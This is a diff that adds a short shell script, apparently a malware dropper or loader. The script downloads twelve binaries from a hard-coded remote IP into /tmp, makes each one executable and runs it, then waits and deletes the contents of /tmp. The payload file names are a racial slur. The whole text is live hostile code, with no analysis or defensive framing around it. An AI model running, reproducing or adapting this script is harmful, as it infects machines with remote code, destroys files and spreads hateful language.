@@ -1,0 +1,19 @@
+#!/bin/sh
+
+IP="163.172.104.150"
+
+wget -c http://$IP/NIGGER.1 -P /tmp && chmod +x /tmp/NIGGER.1 && /tmp/NIGGER.1
+wget -c http://$IP/NIGGER.2 -P /tmp && chmod +x /tmp/NIGGER.2 && /tmp/NIGGER.2
+wget -c http://$IP/NIGGER.3 -P /tmp && chmod +x /tmp/NIGGER.3 && /tmp/NIGGER.3
+wget -c http://$IP/NIGGER.4 -P /tmp && chmod +x /tmp/NIGGER.4 && /tmp/NIGGER.4
+wget -c http://$IP/NIGGER.5 -P /tmp && chmod +x /tmp/NIGGER.5 && /tmp/NIGGER.5
+wget -c http://$IP/NIGGER.6 -P /tmp && chmod +x /tmp/NIGGER.6 && /tmp/NIGGER.6
+wget -c http://$IP/NIGGER.7 -P /tmp && chmod +x /tmp/NIGGER.7 && /tmp/NIGGER.7
+wget -c http://$IP/NIGGER.8 -P /tmp && chmod +x /tmp/NIGGER.8 && /tmp/NIGGER.8
+wget -c http://$IP/NIGGER.9 -P /tmp && chmod +x /tmp/NIGGER.9 && /tmp/NIGGER.9
+wget -c http://$IP/NIGGER.10 -P /tmp && chmod +x /tmp/NIGGER.10 && /tmp/NIGGER.10
+wget -c http://$IP/NIGGER.11 -P /tmp && chmod +x /tmp/NIGGER.11 && /tmp/NIGGER.11
+wget -c http://$IP/NIGGER.12 -P /tmp && chmod +x /tmp/NIGGER.12 && /tmp/NIGGER.12
+
+sleep 3;
+rm -fr /tmp/*
